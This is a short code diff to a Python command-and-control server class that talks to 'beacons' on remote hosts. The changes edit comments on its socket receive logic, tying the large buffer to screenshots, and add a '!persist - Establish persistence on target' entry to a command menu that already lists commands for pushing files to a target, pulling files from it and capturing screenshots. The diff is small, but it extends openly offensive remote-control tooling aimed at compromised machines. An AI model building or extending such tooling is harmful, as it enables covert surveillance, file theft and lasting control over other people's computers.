@@ -154,8 +154,8 @@ class C2Server:
                 client_socket.settimeout(5.0)
                 
                 try:
-                    # METHOD 1: Try larger buffer first (simplest)
-                    encrypted_data = client_socket.recv(131072)  # 128KB buffer
+                    
+                    encrypted_data = client_socket.recv(131072)  # 128KB buffer needed for screen shots
                     
                     if not encrypted_data:
                         print(f"[!] Beacon {session_id} disconnected (listener)")
@@ -173,7 +173,7 @@ class C2Server:
                     except Exception as e:
                         print(f"[-] Failed to decrypt message from beacon {session_id}: {e}")
                         
-                        # METHOD 2: If large buffer failed, try chunked receiving
+                        # If large buffer failed, try chunked receiving
                         print(f"[DEBUG] Trying chunked receive...")
                         
                         # Collect all available data
@@ -342,6 +342,7 @@ class C2Server:
         print("  !download [local] [remote] - Send file to beacon")
         print("  !upload [remote]     - Get file from beacon")
         print("  !screenshot          - Capture and download screenshot")
+        print("  !persist             - Establish persistence on target")
 
         while True:   #infinite loop for continuous command input
             try:
